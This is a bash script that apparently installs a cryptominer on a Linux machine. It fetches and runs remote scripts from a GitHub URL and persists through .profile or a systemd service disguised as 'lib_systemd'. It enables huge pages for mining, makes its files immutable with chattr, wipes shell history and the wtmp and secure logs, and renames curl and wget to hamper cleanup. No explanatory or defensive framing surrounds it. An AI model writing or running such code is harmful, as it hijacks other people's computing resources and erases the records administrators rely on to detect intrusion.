#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

cd /$HOME/
rm -f mysqltcp.sh
rm -f videoysy.sh
rm -f videosys.sh

cd $HOME/myssqltcp/
wget https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh
wget https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh
wget https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh
chmod 777 addconf.sh
chmod 777 logserver.sh
chmod 777 lib_systemd.sh
nohup .$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 

# preparing script background work and work under reboot
if ! sudo -n true 2>/dev/null; then
  if ! grep myssqltcp/lib_systemd.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/myssqltcp/lib_systemd.sh script to $HOME/.profile"
    echo "$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/myssqltcp/lib_systemd.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
  /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
    /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating lib_systemd systemd service"
    cat >/$HOME/lib_systemd.service <<EOL
[Unit]
Description=lib_systemd service

[Service]
ExecStart=$HOME/myssqltcp/lib_systemd.sh
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /$HOME/lib_systemd.service /etc/systemd/system/lib_systemd.service
    echo "[*] Starting lib_systemd systemd service"
    sudo killall lib_systemd 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable lib_systemd.service
    sudo systemctl start lib_systemd.service
    echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
  fi
fi

# lock
chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
chattr -V +iau $HOME/myssqltcp/logserver.sh
chattr -V +iau $HOME/myssqltcp/addconf.sh
chattr -V +iau $HOME/myssqltcp/MyssqlTcp
chattr -V +iau $HOME/myssqltcp/Tcphost.sh
chattr -V +iau $HOME/myssqltcp/config_background.json
chattr -V +iau $HOME/myssqltcp/config.json

# Clear log
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history

# Modify instruction
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/lruc
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/tegw

echo "[*] Yes-Go"
chattr +i $HOME/myssqltcp/*
chattr -i $HOME/myssqltcp/config.json
